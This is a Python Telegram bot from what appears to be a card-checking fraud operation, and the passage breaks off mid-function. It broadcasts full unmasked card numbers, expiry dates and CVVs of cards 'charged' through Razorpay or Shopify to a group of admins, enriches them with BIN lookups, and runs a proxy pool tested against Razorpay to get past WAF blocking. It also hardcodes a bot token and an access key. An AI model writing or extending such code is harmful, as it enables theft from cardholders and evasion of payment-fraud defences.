"""
tg_bot.py — Telegram bot for charged/approved card notifications.

Features:
  - Owner (8838578704) can manage admins via /admin add/remove
  - /start shows user their ID (they ask owner for access)
  - When API detects a charged/approved card, bot broadcasts formatted message
    to owner + all admins via DM with rate-limit-safe delivery.
  - BIN enrichment via api.chargeblast.com for card metadata.
  - Asyncio queue for non-blocking integration with FastAPI.

Telegram rate limits: ~30 msgs/sec per chat group, ~20 msgs/sec to different
chats.  We use sequential sends with 50ms delay between recipients to stay
well under limits.
"""

from __future__ import annotations

import asyncio
import json
import fcntl
import os
import re
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Optional

import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ChatType
from telegram.ext import (
    Application, CommandHandler, ContextTypes,
    MessageHandler, CallbackQueryHandler, filters,
)

import proxy_manager

# ── Configuration ────────────────────────────────────────────────────────────

BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "8620542187:AAFeVplF4GQH-_NiOWoOflk3754VrKaoV8U")
OWNER_ID = int(os.environ.get("TG_OWNER_ID", "8462705169"))
_DATA_DIR = os.environ.get("PROXY_DATA_DIR", os.path.dirname(os.path.abspath(__file__)))
os.makedirs(_DATA_DIR, exist_ok=True)
ADMINS_FILE = os.path.join(_DATA_DIR, "admins.json")
BIN_API = "https://api.chargeblast.com/bin/"
BINLIST_API = "https://lookup.binlist.net/"

# Country code → flag emoji
COUNTRY_FLAGS: dict[str, str] = {
    "US": "🇺🇸", "GB": "🇬🇧", "CA": "🇨🇦", "AU": "🇦🇺", "IN": "🇮🇳",
    "DE": "🇩🇪", "FR": "🇫🇷", "JP": "🇯🇵", "SG": "🇸🇬", "AE": "🇦🇪",
    "BR": "🇧🇷", "MX": "🇲🇽", "ES": "🇪🇸", "IT": "🇮🇹", "NL": "🇳🇱",
    "SE": "🇸🇪", "CH": "🇨🇭", "HK": "🇭🇰", "KR": "🇰🇷", "CN": "🇨🇳",
}

# ── Admin storage ────────────────────────────────────────────────────────────

_admins_lock = threading.Lock()

# In-memory cache — always kept in sync with disk by _save_admins / _load_admins.
# Initialize on import.
DEFAULT_ADMIN_ID = 8838578704  # same as owner — no extra defaults
SECOND_ADMIN_ID = 8139978873   # additional permanent admin
_admins: set[int] = {OWNER_ID, DEFAULT_ADMIN_ID, SECOND_ADMIN_ID}


def _load_admins() -> set[int]:
    """Load admin IDs from JSON file.  Owner is always included.
    Returns a COPY — callers must not mutate the returned set directly."""
    global _admins
    with _admins_lock:
        try:
            if os.path.exists(ADMINS_FILE):
                with open(ADMINS_FILE) as f:
                    data = json.load(f)
                    stored = data.get("admins", [])
                    loaded = {OWNER_ID, DEFAULT_ADMIN_ID, SECOND_ADMIN_ID} | {int(x) for x in stored}
                    _admins = loaded
                    return loaded.copy()
        except Exception as e:
            print(f"[tg_bot] ERROR loading admins: {e}", file=sys.stderr)
        # Fallback: return cached set
        return _admins.copy()


def _save_admins(admins: set[int]):
    """Persist admin IDs.  Atomic write: temp file → rename.
    Updates in-memory cache.  Thread-safe."""
    global _admins
    data = {"admins": sorted(a for a in admins if a != OWNER_ID)}
    tmp_path = ADMINS_FILE + ".tmp"
    try:
        with open(tmp_path, "w") as f:
            json.dump(data, f)
        os.replace(tmp_path, ADMINS_FILE)  # atomic on POSIX
        with _admins_lock:
            _admins = admins.copy()
        print(f"[tg_bot] saved admins: {sorted(admins)}", file=sys.stderr)
    except Exception as e:
        print(f"[tg_bot] ERROR saving admins: {e}", file=sys.stderr)



def _get_public_ip() -> str:
    """Fetch the VPS public IP from an external echo service (not the local iface)."""
    for url in ("https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com"):
        try:
            r = httpx.get(url, timeout=6.0, follow_redirects=True)
            ip = r.text.strip()
            if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip):
                return ip
        except Exception:
            continue
    return "unknown"


def _fmt_uptime(sec: float) -> str:
    sec = int(sec)
    d, rem = divmod(sec, 86400)
    h, rem = divmod(rem, 3600)
    m, _ = divmod(rem, 60)
    return f"{d}d {h}h {m}m"


def _read_cpu_times():
    with open("/proc/stat") as f:
        line = f.readline()
    parts = [int(x) for x in line.split()[1:]]
    idle = parts[3] + (parts[4] if len(parts) > 4 else 0)  # idle + iowait
    return idle, sum(parts)


def _live_cpu_percent(sample_s: float = 0.6) -> str:
    """Live CPU usage across all cores (two-sample /proc/stat delta)."""
    try:
        idle1, total1 = _read_cpu_times()
        time.sleep(sample_s)
        idle2, total2 = _read_cpu_times()
        didle = idle2 - idle1
        dtotal = total2 - total1
        if dtotal <= 0:
            return "unknown"
        return f"{100.0 * (dtotal - didle) / dtotal:.1f}%"
    except Exception:
        return "unknown"


def _vps_status_text(live_cpu: str = None) -> str:
    """Human-readable VPS health + public IP block.  Every call re-reads
    /proc + re-fetches the WAN IP, so the values are always fresh (never cached)."""
    hostname = "unknown"
    try:
        hostname = open("/proc/sys/kernel/hostname").read().strip()
    except Exception:
        pass

    uptime = "unknown"
    try:
        up = float(open("/proc/uptime").read().split()[0])
        uptime = _fmt_uptime(up)
    except Exception:
        pass

    load = "unknown"
    try:
        parts = open("/proc/loadavg").read().split()
        load = " ".join(parts[:3])
    except Exception:
        pass

    mem = "unknown"
    try:
        total_mb = avail_mb = 0
        for line in open("/proc/meminfo").read().splitlines():
            if line.startswith("MemTotal:"):
                total_mb = int(line.split()[1]) // 1024
            elif line.startswith("MemAvailable:"):
                avail_mb = int(line.split()[1]) // 1024
        mem = f"{total_mb - avail_mb}/{total_mb} MB"
    except Exception:
        pass

    disk = "unknown"
    try:
        st = os.statvfs("/")
        used_gb = (st.f_blocks - st.f_bfree) * st.f_frsize / 1024 ** 3
        total_gb = st.f_blocks * st.f_frsize / 1024 ** 3
        disk = f"{used_gb:.1f}/{total_gb:.1f} GB"
    except Exception:
        pass

    cpus = "unknown"
    try:
        cpus = str(open("/proc/cpuinfo").read().count("processor"))
    except Exception:
        pass

    if live_cpu is None:
        live_cpu = _live_cpu_percent()

    return (
        "\n<b>🚀 VPS Online</b>\n"
        "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"🖥 <b>Hostname:</b> {hostname}\n"
        f"🌐 <b>Public IP:</b> <code>{_get_public_ip()}</code>\n"
        f"⏱ <b>Uptime:</b> {uptime}\n"
        f"⚙️ <b>Load:</b> {load}\n"
        f"⚡ <b>CPU:</b> {live_cpu} ({cpus} cores)\n"
        f"🧠 <b>RAM used:</b> {mem}\n"
        f"💾 <b>Disk used:</b> {disk}\n"
        "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
    )

# ── Stats counters (file-backed for cross-worker visibility) ──────────────
# Gunicorn pre-forks workers — each has its own memory space.  In-memory stats
# would show different values per worker.  We write each worker's stats to a
# pid-named JSON file atomically; get_stats() aggregates all workers' files.

_STATS_DIR = os.path.join(_DATA_DIR, ".stats")
_STATS_KEYS = ("waf_403", "rzp_5xx", "gateway_error", "total_checkouts")

_stats_lock = threading.Lock()
_flush_lock = threading.Lock()  # serializes read-modify-write in _flush_stats
_stats: dict[str, int] = {k: 0 for k in _STATS_KEYS}
_last_flush: float = 0.0


def _stats_pid_path() -> str:
    return os.path.join(_STATS_DIR, f"stats_{os.getpid()}.json")


def _flush_stats():
    """Write current worker's cumulative stats to disk atomically.

    Reads the existing pid-file, adds the in-memory delta, writes the sum.
    Resets in-memory counters after persisting.  Serialized via _flush_lock
    to prevent concurrent read-modify-write races."""
    global _last_flush
    with _flush_lock:
        path = _stats_pid_path()
        tmp = path + ".tmp"
        try:
            os.makedirs(_STATS_DIR, exist_ok=True)
            # Read existing cumulative totals from this worker's file
            existing: dict[str, int] = {k: 0 for k in _STATS_KEYS}
            if os.path.exists(path):
                try:
                    with open(path) as f:
                        prev = json.load(f)
                    for k in _STATS_KEYS:
                        existing[k] = prev.get("stats", {}).get(k, 0)
                except (json.JSONDecodeError, OSError):
                    pass
            # Drain in-memory delta, add to cumulative
            with _stats_lock:
                for k in _STATS_KEYS:
                    existing[k] += _stats.get(k, 0)
                    _stats[k] = 0
            with open(tmp, "w") as f:
                json.dump({"pid": os.getpid(), "ts": time.time(),
                           "stats": existing}, f)
            os.replace(tmp, path)
            _last_flush = time.time()
        except Exception:
            pass  # disk full / permissions — not critical


def increment_stat(key: str):
    """Thread-safe increment + flush to disk for cross-worker visibility."""
    with _stats_lock:
        if key in _stats:
            _stats[key] += 1
    # Throttle flushes: max 1/second to avoid disk thrash on hot path
    if time.time() - _last_flush >= 1.0:
        _flush_stats()


def get_stats() -> dict:
    """Aggregate stats from ALL workers by reading pid-named files.

    Purges stale files (worker dead > 90s) automatically."""
    merged: dict[str, int] = {k: 0 for k in _STATS_KEYS}
    try:
        os.makedirs(_STATS_DIR, exist_ok=True)
        now = time.time()
        for fname in os.listdir(_STATS_DIR):
            if not fname.startswith("stats_") or not fname.endswith(".json"):
                continue
            fpath = os.path.join(_STATS_DIR, fname)
            try:
                with open(fpath) as f:
                    data = json.load(f)
                # Purge workers that haven't flushed in 90s (process dead)
                if now - data.get("ts", 0) > 90:
                    try:
                        os.remove(fpath)
                    except OSError:
                        pass
                    continue
                for k, v in data.get("stats", {}).items():
                    if k in merged:
                        merged[k] += v
            except (json.JSONDecodeError, OSError):
                pass
    except Exception:
        pass
    # Also merge current worker's in-memory (may not be flushed yet)
    with _stats_lock:
        for k in _STATS_KEYS:
            merged[k] += _stats.get(k, 0)
    return merged


# ── Notification queue ───────────────────────────────────────────────────────

@dataclass
class ChargeNotification:
    """A charged/approved card notification to broadcast."""
    card_line: str           # "number|MM|YYYY|CVV"
    gateway: str             # "Razorpay" or "Shopify"
    message: str             # "Payment Successfully" etc.
    amount_inr: str          # "₹50.00"
    site: str                # payment page URL
    bin_first6: str = ""     # first 6 digits for BIN lookup
    created_at: float = field(default_factory=time.time)


# Global queue — lazily initialized inside the running event loop.
# Creating asyncio.Queue at module import time binds it to the default loop,
# which is not the same loop Uvicorn/Gunicorn uses → RuntimeError at runtime.
_notify_queue: Optional[asyncio.Queue] = None
_bot_app: Optional[Application] = None
_last_warn_ts: float = 0.0  # Throttle "failed to send" warnings
_worker_task: Optional[asyncio.Task] = None
_polling_lock_fd: Optional[int] = None  # fd for tg_polling.lock — single bot worker election


def _get_notify_queue() -> asyncio.Queue:
    """Return the notification queue, creating it lazily inside the running loop."""
    global _notify_queue
    if _notify_queue is None:
        _notify_queue = asyncio.Queue(maxsize=1000)
    return _notify_queue

# Prime the in-memory admin cache at import time
_load_admins()


# ── Rate-limited broadcaster ─────────────────────────────────────────────────

async def _broadcast_to_admins(text: str):
    """Send a message to ALL admins (including owner) with rate limiting.

    Telegram limit: ~30 msg/sec.  We send sequentially with 50ms delay
    between each recipient, giving ~20 msg/sec max burst rate.
    If admins grow large, we batch with controlled concurrency.
    """
    global _bot_app, _last_warn_ts
    if _bot_app is None:
        return

    # Get current admin list (lock-protected)
    current_admins = _load_admins()

    sent = 0
    failed = 0
    for uid in sorted(current_admins):
        try:
            await _bot_app.bot.send_message(chat_id=uid, text=text,
                                            disable_web_page_preview=True)
            sent += 1
        except Exception:
            failed += 1
        # Rate limit: 50ms between sends = 20 msg/sec max
        await asyncio.sleep(0.05)

    if failed > 0 and sent == 0:
        # Throttle warning to once per 300s — prevents log flood when
        # Telegram API is rate-limiting or bot token is invalid.
        now = time.time()
        if now - _last_warn_ts >= 300:
            _last_warn_ts = now
            print(f"[tg_bot] WARNING: failed to send to all {len(current_admins)} admins",
                  file=sys.stderr)


# ── BIN lookup ───────────────────────────────────────────────────────────────

async def _lookup_bin(bin6: str) -> Optional[dict]:
    """Fetch BIN metadata — primary: api.chargeblast.com (user's specified API),
    supplements with lookup.binlist.net for card level (CLASSIC/GOLD/etc.)."""
    result = None

    # Primary: chargeblast (user's unlimited BIN API)
    try:
        async with httpx.AsyncClient(timeout=8.0) as client:
            r = await client.get(f"{BIN_API}{bin6}")
            if r.status_code == 200:
                data = r.json()
                result = {
                    "brand": data.get("brand", "").upper(),
                    "level": "",
                    "type": data.get("type", "").upper(),
                    "issuer": data.get("issuer", "").upper(),
                    "country": data.get("country", "").upper(),
                    "flag": COUNTRY_FLAGS.get(data.get("a2", "").upper(), ""),
                    "_source": "chargeblast",
                }
    except Exception:
        pass

    # Supplement with binlist.net for card level (CLASSIC, GOLD, PLATINUM, etc.)
    # chargeblast doesn't provide this — binlist fills the gap.
    if result:
        try:
            async with httpx.AsyncClient(timeout=8.0) as client:
                r2 = await client.get(f"{BINLIST_API}{bin6}")
                if r2.status_code == 200:
                    data2 = r2.json()
                    brand_raw = data2.get("brand", "")
                    parts = brand_raw.split(" ", 1)
                    if len(parts) > 1:
                        result["level"] = parts[1].upper()  # CLASSIC, GOLD, etc.
                    # Enrich with better issuer/country data if available
                    bank = (data2.get("bank", {}) or {})
                    if bank.get("name"):
                        result["issuer"] = bank["name"].upper()
                    country_data = (data2.get("country", {}) or {})
                    if country_data.get("emoji"):
                        result["flag"] = country_data["emoji"]
                    if country_data.get("name"):
                        result["country"] = country_data["name"].upper()
        except Exception:
            pass  # binlist failed — use chargeblast result as-is

    return result


# ── Message formatter ────────────────────────────────────────────────────────

async def format_charge_message(notif: ChargeNotification) -> str:
    """Build the formatted notification message with BIN enrichment."""
    sep = "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"

    # Show FULL card line (not masked) — per user's template
    card_display = notif.card_line

    # BIN enrichment (only for charged/approved cards)
    bin_info = None
    if notif.bin_first6:
        bin_info = await _lookup_bin(notif.bin_first6)

    if bin_info and bin_info.get("brand"):
        brand = bin_info["brand"]
        level = bin_info.get("level", "")
        ctype = bin_info["type"]
        issuer = bin_info["issuer"]
        country = bin_info["country"]
        flag = bin_info.get("flag", "")

        # Build card header: "VISA · DEBIT" or "VISA · DEBIT · CLASSIC"
        if level:
            card_line = f"🧑 {brand} · {ctype} · {level}"
        else:
            card_line = f"🧑 {brand} · {ctype}"
        bank_line = f"💼 {issuer}"
        country_line = f"🌐 {country} {flag}".strip()
    else:
        card_line = "🧑 UNKNOWN"
        bank_line = "💼 UNKNOWN"
        country_line = "🌐 UNKNOWN"

    # Site shortener
    site_short = notif.site
    if len(site_short) > 50:
        parts_url = site_short.split("/")
        site_short = "/".join(parts_url[:4])

    return f"""{sep}

💳 {card_display}

{sep}
🛒 Gateway  » {notif.gateway}
📋 Response » {notif.message}
🆓 Price    » {notif.amount_inr}
🔗 Site     » {site_short}

{sep}
{card_line}
{bank_line}
{country_line}
{sep}"""


# ── Bot worker ───────────────────────────────────────────────────────────────

async def _notification_worker():
    """Background task: consume notification queue and broadcast."""
    print("[tg_bot] notification worker started", file=sys.stderr)
    while True:
        try:
            notif = await _get_notify_queue().get()
            text = await format_charge_message(notif)
            await _broadcast_to_admins(text)
            _get_notify_queue().task_done()
        except asyncio.CancelledError:
            break
        except Exception as e:
            print(f"[tg_bot] worker error: {e}", file=sys.stderr)


# ── Public API (called from api.py) ──────────────────────────────────────────

def notify_charge(card_line: str, gateway: str, message: str,
                  amount_inr: str, site: str):
    """Enqueue a charged/approved card notification.

    Called from api.py when result status is 'charged' or 'approved'.
    Non-blocking — just drops the notification on the queue.
    """
    bin_first6 = ""
    parts = card_line.split("|")
    if parts and len(parts[0]) >= 6:
        bin_first6 = parts[0][:6]

    notif = ChargeNotification(
        card_line=card_line,
        gateway=gateway,
        message=message,
        amount_inr=amount_inr,
        site=site,
        bin_first6=bin_first6,
    )
    try:
        _get_notify_queue().put_nowait(notif)
    except asyncio.QueueFull:
        print("[tg_bot] WARNING: notification queue full, dropping charge alert",
              file=sys.stderr)


def is_admin(user_id: int) -> bool:
    """Check if a user is an admin (or owner)."""
    return user_id in _load_admins()


# ── Bot commands ─────────────────────────────────────────────────────────────

async def _cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show live VPS health — RAM, CPU, disk, public IP, uptime, load."""
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("⚠️ Not authorized.")
        return
    msg = await update.message.reply_text("⏳ Measuring live CPU...")
    text = "🖥 <b>VPS Status</b>\n" + _vps_status_text()
    await msg.edit_text(text, parse_mode="HTML")


async def _cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user their ID so they can request access from owner."""
    uid = update.effective_user.id
    name = update.effective_user.first_name or "there"
    is_admin_val = is_admin(uid)

    if is_admin_val:
        await update.message.reply_text(
            f"👋 Hello {name}!\n\n"
            f"🆔 Your ID: `{uid}`\n"
            f"✅ You are an **admin** — you will receive charged card notifications.\n\n"
            f"Commands:\n"
            f"  `/admin add <id>` — add a new admin\n"
            f"  `/admin remove <id>` — remove an admin\n"
            f"  `/admin list` — list all admins\n"
            f"  `/log` — show stats\n"
            f"  `/addproxies` — add proxies to pool\n"
            f"  `/proxypool` — view/manage proxy pool\n"
            f"  `/proxydead` — download 406-hit proxy list\n"
            f"  Use `?key=limca` for API proxy access",
            parse_mode="Markdown",
        )
    else:
        await update.message.reply_text(
            f"👋 Hello {name}!\n\n"
            f"🆔 Your ID: `{uid}`\n\n"
            f"⚠️ You are **not authorized**. Send your ID to @Enchanted_linux_0x "
            f"to request access.\n\n"
            f"Once approved, you will receive charged card notifications.",
            parse_mode="Markdown",
        )


async def _cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Manage admins.  Owner-only command.

    Usage:
      /admin add 123456789
      /admin remove 123456789
      /admin list
    """
    uid = update.effective_user.id

    # Only owner can manage admins
    if uid != OWNER_ID:
        await update.message.reply_text("⛔ This command is only available to the bot owner.")
        return

    args = context.args or []
    if not args:
        await update.message.reply_text(
            "Usage:\n"
            "  `/admin add <user_id>` — add admin\n"
            "  `/admin remove <user_id>` — remove admin\n"
            "  `/admin list` — list admins",
            parse_mode="Markdown",
        )
        return

    subcommand = args[0].lower()
    admins = _load_admins()

    if subcommand == "list":
        lines = [f"• `{a}`" for a in sorted(admins)]
        await update.message.reply_text(
            f"**Admins ({len(admins)}):**\n" + "\n".join(lines),
            parse_mode="Markdown",
        )
        return

    if subcommand in ("add", "remove") and len(args) < 2:
        await update.message.reply_text(f"Usage: `/admin {subcommand} <user_id>`",
                                        parse_mode="Markdown")
        return

    if subcommand == "add":
        try:
            new_id = int(args[1])
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID. Must be a number.")
            return

        if new_id in admins:
            await update.message.reply_text(f"ℹ️ User `{new_id}` is already an admin.",
                                            parse_mode="Markdown")
        else:
            admins.add(new_id)
            _save_admins(admins)
            await update.message.reply_text(f"✅ Added `{new_id}` as admin.",
                                            parse_mode="Markdown")

    elif subcommand == "remove":
        try:
            rm_id = int(args[1])
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID. Must be a number.")
            return

        if rm_id == OWNER_ID:
            await update.message.reply_text("⛔ Cannot remove the owner.")
            return

        if rm_id in admins:
            admins.discard(rm_id)
            _save_admins(admins)
            await update.message.reply_text(f"✅ Removed `{rm_id}` from admins.",
                                            parse_mode="Markdown")
        else:
            await update.message.reply_text(f"ℹ️ User `{rm_id}` is not an admin.",
                                            parse_mode="Markdown")

    else:
        await update.message.reply_text(
            "Unknown subcommand. Use: `add`, `remove`, or `list`.",
            parse_mode="Markdown",
        )


async def _cmd_log(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show stats — admin-only command.

    Usage: /log
    Shows: WAF 403 count, Razorpay 5xx count, gateway errors, total checkouts.
    """
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("⛔ Admin only.")
        return

    stats = get_stats()
    pool = proxy_manager.get_pool_stats()
    sep = "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
    await update.message.reply_text(
        f"{sep}\n"
        f"📊 Stats\n"
        f"{sep}\n"
        f"🚨 WAF 403 (exhausted):  {stats['waf_403']}\n"
        f"🔴 Rzp Cancel 5xx:       {stats['rzp_5xx']}\n"
        f"🏦 Gateway Errors:       {stats['gateway_error']}\n"
        f"✅ Total Checkouts:      {stats['total_checkouts']}\n"
        f"{sep}\n"
        f"🟢 Pool Live:            {pool['live']}\n"
        f"📦 Pool Total:           {pool['total']}\n"
        f"{sep}\n"
        f"👥 Admins: {len(_load_admins())}\n"
        f"📦 Queue:  {_get_notify_queue().qsize()}\n"
        f"{sep}",
        parse_mode="Markdown",
    )


# ── Proxy management commands ────────────────────────────────────────────────

def _parse_proxy_list(text: str) -> list[str]:
    """Extract proxy URLs from text — one per line, ignores blanks/comments.
    Only matches host:port:user:pass format (4+ colon-separated parts)."""
    lines = []
    for line in text.strip().split("\n"):
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("/"):
            continue
        # Require at least 4 colon-separated parts: host:port:user:pass
        if line.count(":") >= 3:
            lines.append(line)
    return lines


async def _process_proxies(update: Update, proxy_list: list[str]):
    """Test proxies and send summary. Shared between /addproxies and file handler."""
    if not proxy_list:
        await update.message.reply_text("❌ No valid proxy format found. Use: host:port:user:pass")
        return

    status_msg = await update.message.reply_text(
        f"🔄 Testing {len(proxy_list)} proxies against Razorpay...\n"
        f"⏱ This may take a few seconds."
    )

    # Threaded bulk test
    summary = await asyncio.to_thread(
        proxy_manager.bulk_check_proxies_threaded, proxy_list
    )

    sep = "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
    dupes = summary.get("duplicates_skipped", 0)
    pool_stats = proxy_manager.get_pool_stats()
    text = (
        f"{sep}\n"
        f"📊 Proxy Test Results\n"
        f"{sep}\n"
        f"🟢 Live (added to pool):  {summary['live']}\n"
        f"🔴 Blocked (removed):     {summary['blocked']}\n"
        f"🔴 Dead (removed):        {summary['dead']}\n"
        f"⚫ Invalid format:         {summary['invalid']}\n"
        f"{'📎 Duplicates skipped:    ' + str(dupes) if dupes > 0 else ''}"
        f"{sep}\n"
        f"📦 Pool: {pool_stats['live']} live, "
        f"{pool_stats['total']} total"
    )

    # Show first 10 results
    for r in summary.get("results", [])[:10]:
        emoji = {"live": "🟢", "blocked": "🔴", "dead": "🔴", "invalid": "⚫"}.get(r.get("status"), "❓")
        detail = r.get("error") or f"HTTP {r.get('http_code', '?')}"
        text += f"\n{emoji} {r['proxy']} — {detail[:60]}"

    if len(summary.get("results", [])) > 10:
        text += f"\n... and {len(summary['results']) - 10} more"

    text += f"\n{sep}"

    try:
        await status_msg.edit_text(text)
    except Exception:
        await update.message.reply_text(text)


async def _cmd_addproxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add proxies to the pool. Admin-only.

    Usage:
      /addproxies host:port:user:pass   — single proxy
      /addproxies                        — then paste multi-line list
      Or send a .txt file directly
    """
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("⛔ Admin only.")
        return

    # Read FULL message text to support multi-line paste
    full_text = update.message.text or ""
    # Strip the /addproxies command word itself
    if full_text.startswith("/addproxies"):
        full_text = full_text[len("/addproxies"):].strip()
        # Also strip inline args on the same line if any (already in full_text after command)
    lines = _parse_proxy_list(full_text)
    if lines:
        await _process_proxies(update, lines)
    else:
        await update.message.reply_text(
            "📥 Send me the proxies — one per line:\n"
            "`host:port:user:pass`\n\n"
            "Or send a `.txt` file with proxies.\n"
            "You can also paste multiple proxies directly after the command.",
            parse_mode="Markdown",
        )


async def _handle_text_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Intercept text messages that look like proxy lists (admin only)."""
    uid = update.effective_user.id
    if not is_admin(uid):
        return
    text = update.message.text or ""
    proxies = _parse_proxy_list(text)
    if len(proxies) >= 1:
        await _process_proxies(update, proxies)


async def _handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle .txt file upload with proxy list."""
    uid = update.effective_user.id
    if not is_admin(uid):
        return

    doc = update.message.document
    if doc is None:
        return

    # Only process .txt files
    fname = doc.file_name or ""
    if not fname.lower().endswith(".txt"):
        return

    try:
        file_obj = await context.bot.get_file(doc.file_id)
        content = await file_obj.download_as_bytearray()
        text = content.decode("utf-8", errors="replace")
        proxies = _parse_proxy_list(text)
        await _process_proxies(update, proxies)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to read file: {e}")


def _truncate_msg(text: str, total: int, max_chars: int = 3800) -> str:
    """Truncate message to fit Telegram's 4096-char limit, showing count if cut."""
    if len(text) <= max_chars:
        return text
    # Cut back line by line until within limit
    lines = text.split("\n")
    footer = f"\n... showing {len(lines) - 2 - sum(1 for l in lines if l.startswith('•'))} of {total} — pool has no limit"
    while len("\n".join(lines)) + len(footer) > max_chars and len(lines) > 3:
        lines.pop()
    return "\n".join(lines) + footer


def _build_pool_keyboard() -> InlineKeyboardMarkup:
    """Shared keyboard builder for pool views."""
    stats = proxy_manager.get_pool_stats()
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"🟢 Live ({stats['live']})", callback_data="pool_live"),
            InlineKeyboardButton("📊 Full List", callback_data="pool_full"),
        ],
        [
            InlineKeyboardButton("🔄 Refresh", callback_data="pool_refresh"),
            InlineKeyboardButton("🔁 Recheck All", callback_data="pool_recheck"),
        ],
    ])


async def _handle_recheck_all(query):
    """Recheck all saved proxies against Razorpay.
    Live proxies stay in pool, dead/blocked ones are removed."""
    await query.edit_message_text(
        "🔁 Rechecking all saved proxies...\nThis may take a moment."
    )

    all_proxies = proxy_manager.get_all_live_proxies()

    # Build full proxy URLs from pool entries
    proxy_urls = []
    seen = set()
    for p in all_proxies:
        full = p.get("full_url", "")
        if not full:
            full = f"{p['host']}:{p['port']}:{p['user']}:{p['pass']}"
        if full not in seen:
            proxy_urls.append(full)
            seen.add(full)

    total = len(proxy_urls)
    if total == 0:
        await query.edit_message_text(
            "📭 No proxies in pool to recheck.",
            reply_markup=_build_pool_keyboard(),
        )
        return

    # Bulk test all proxies (threaded, deduped)
    summary = await asyncio.to_thread(
        proxy_manager.bulk_check_proxies_threaded, proxy_urls
    )

    sep = "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
    pool_stats = proxy_manager.get_pool_stats()
    text = (
        f"{sep}\n"
        f"🔁 Recheck Complete\n"
        f"{sep}\n"
        f"🟢 Still Live:     {summary['live']}\n"
        f"🔴 Blocked (removed): {summary['blocked']}\n"
        f"🔴 Dead (removed):    {summary['dead']}\n"
        f"⚫ Invalid:            {summary['invalid']}\n"
        f"{sep}\n"
        f"📦 Pool: {pool_stats['live']} live, "
        f"{pool_stats['total']} total"
    )

    # Show dead/invalid results
    dead_results = [r for r in summary.get("results", []) if r.get("status") in ("dead", "invalid")]
    for r in dead_results[:10]:
        emoji = "🔴" if r.get("status") == "dead" else "⚫"
        err = (r.get("error") or "")[:50]
        text += f"\n{emoji} {r['proxy']} — {err}"

    text += f"\n{sep}"

    await query.edit_message_text(text, reply_markup=_build_pool_keyboard())


async def _cmd_proxydead(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send the proxy_dead.json file to the owner.

    These are proxies that hit WAF 406 (session/IP-rotation issues) —
    NOT bad proxies.  The owner can review and reuse them later."""
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("⛔ Admin only.")
        return

    filepath = proxy_manager.get_dead_proxy_file()
    count = proxy_manager.get_dead_proxy_count()

    if not filepath or count == 0:
        await update.message.reply_text("📭 No dead proxies recorded yet.")
        return

    caption = (
        f"📄 Dead Proxies ({count} entries)\n"
        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"These proxies hit WAF 406 — typically a session/IP-rotation\n"
        f"issue, not a bad proxy. Review and reuse as needed.\n"
        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
    )

    try:
        with open(filepath, "rb") as f:
            await update.message.reply_document(
                document=f,
                filename="proxy_dead.json",
                caption=caption,
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send file: {e}")


async def _cmd_proxypool(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show proxy pool with inline keyboard for navigation."""
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("⛔ Admin only.")
        return

    stats = proxy_manager.get_pool_stats()

    sep = "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
    text = (
        f"{sep}\n"
        f"📦 Proxy Pool\n"
        f"{sep}\n"
        f"🟢 Live:  {stats['live']}\n"
        f"📦 Total: {stats['total']}\n"
        f"{sep}"
    )

    await update.message.reply_text(
        text,
        reply_markup=_build_pool_keyboard(),
    )


async def _handle_pool_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline button callbacks for proxy pool navigation."""
    query = update.callback_query
    await query.answer()

    uid = query.from_user.id
    if not is_admin(uid):
        await query.edit_message_text("⛔ Admin only.")
        return

    action = query.data

    if action == "pool_refresh":
        await _cmd_proxypool(query, context)
        return

    if action == "pool_recheck":
        await _handle_recheck_all(query)
        return

    sep = "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"

    if action == "pool_live":
        all_proxies = proxy_manager.get_all_live_proxies()
        if not all_proxies:
            text = f"{sep}\n🟢 Live Proxies\n{sep}\n(no live proxies)"
        else:
            text = f"{sep}\n🟢 Live Proxies ({len(all_proxies)})\n{sep}"
            for p in all_proxies:
                full = p.get("full_url", p["host"])
                text += f"\n• `{full}` — used {p.get('times_used', 0)}x"
            text = _truncate_msg(text, len(all_proxies))

    elif action == "pool_full":
        text = f"{sep}\n📊 Full Proxy List\n{sep}"
